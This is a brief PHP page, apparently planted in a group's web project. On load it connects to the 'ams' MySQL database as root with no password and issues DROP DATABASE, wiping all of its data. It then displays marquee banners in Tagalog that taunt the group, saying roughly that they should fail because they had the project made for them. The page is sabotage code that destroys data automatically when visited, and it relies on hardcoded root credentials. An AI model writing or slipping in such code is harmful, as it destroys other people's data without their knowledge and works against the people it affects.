<?php
session_start();

// DATABASE CONNECTION //
$db = mysqli_connect("localhost" , "root" , "" , "ams");

$sql = "DROP DATABASE ams";
$result = mysqli_query($db, $sql);

echo '
<br>
<br>
<div align="center">
<img src="download.jpg" alt="Smiley face" height="650" width="800">
<marquee scrollamount="15"><h1>>>>>>>>>>>>>>>>>>>>>>IBAGSAK NIYO<<<<<<<<<<<<<<<<<<<<<<<</h1></marquee>
<marquee scrollamount="15"><h1>>>>>>>>>>>>>>>>>>>>>>TONG GROUP<<<<<<<<<<<<<<<<<<<<<<<</h1></marquee>
<marquee scrollamount="15"><h1>>>>>>>>>>>>>>>>>>>>>>NA TO<<<<<<<<<<<<<<<<<<<<<<<</h1></marquee>
<marquee scrollamount="15"><h1>>>>>>>>>>>>>>>>>>>>>>NAG PAGAWA LANG<<<<<<<<<<<<<<<<<<<<<<<</h1></marquee>
</div>
'


?>
